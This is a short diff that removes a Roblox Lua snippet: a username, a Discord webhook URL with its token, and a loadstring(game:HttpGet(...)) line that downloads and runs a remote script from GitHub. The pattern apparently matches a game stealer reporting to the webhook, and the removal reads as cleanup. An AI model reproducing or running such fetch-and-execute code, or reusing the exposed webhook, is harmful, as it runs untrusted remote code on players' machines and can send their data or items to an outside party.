@@ -1,4 +1,0 @@
-username = "exortingbitcoin1"
-webhook = "https://discord.com/api/webhooks/1373345233860825098/yWT-DGiR3sI8DnqGtJFgGl7-zJjHj1c35zYM2sZMAc-VEHvXrSraNI-dDJoEpwTBlVeP"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/214scripts/main/refs/heads/main/blade%20ball"))()
